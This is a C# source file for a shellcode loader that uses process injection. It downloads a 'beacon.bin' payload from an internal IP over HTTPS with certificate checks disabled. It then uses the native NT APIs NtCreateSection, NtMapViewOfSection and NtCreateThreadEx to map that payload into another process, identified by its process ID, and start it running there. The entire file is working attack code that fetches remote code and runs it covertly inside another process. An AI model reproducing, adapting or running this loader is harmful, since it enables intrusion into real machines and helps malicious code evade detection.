using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
namespace ConsoleApp1
{
    internal class Native
    {
        [DllImport("ntdll.dll")]
        public static extern uint NtCreateSection(
            ref IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref ulong MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            out IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            out ulong ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll")]
        public static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            int stackZeroBits,
            int sizeOfStack,
            int maximumStackSize,
            IntPtr attributeList);
    }
    internal class Program
    {
        static async Task Main(string[] args)
        {
            byte[] shellcode;

            // Get shellcode
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");
                }
            }

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // Create a new section in the current process
            Native.NtCreateSection(
                ref hSection,
                0x10000000,     // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref maxSize,
                0x40,           // PAGE_EXECUTE_READWRITE
                0x08000000,     // SEC_COMMIT
                IntPtr.Zero);

            // Map that section into memory of the current process as RW
            Native.NtMapViewOfSection(
                hSection,
                (IntPtr)(-1),   // will target the current process
                out var localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,              // ViewUnmap (created view will not be inherited by child processes)
                0,
                0x04);          // PAGE_READWRITE

            // Copy shellcode into memory of our own process
            Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);

            // Get reference to target process
            var target = Process.GetProcessById(4148);

            // Now map this region into the target process as RX
            Native.NtMapViewOfSection(
                hSection,
                target.Handle,
                out var remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                0x20);      // PAGE_EXECUTE_READ

            // Shellcode is now in the target process, execute it (fingers crossed)
            Native.NtCreateThreadEx(
                out _,
                0x001F0000, // STANDARD_RIGHTS_ALL
                IntPtr.Zero,
                target.Handle,
                remoteBaseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);
        }
    }
}
